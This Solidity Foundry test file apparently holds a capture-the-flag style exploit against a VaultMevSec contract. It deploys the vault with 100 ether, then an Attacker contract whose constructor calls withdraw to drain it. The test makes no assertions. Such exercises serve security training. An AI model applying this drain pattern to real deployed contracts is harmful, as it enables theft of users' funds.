pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VaultMevSec/VaultMevSec.sol";

contract VaultMevSecTest is Test {
    VaultMevSec public vault;

    address public attacker;

    function setUp() public {
        vault = (new VaultMevSec){value: 100 ether}();
    }

    function testExploit() public {
        vm.startPrank(attacker);

        Attacker a = new Attacker(address(vault));
        vm.stopPrank();
    }
}

contract Attacker {
    VaultMevSec public v;
    constructor(address _vault) payable {
        v = VaultMevSec(_vault);
        v.withdraw(msg.sender);
    }
}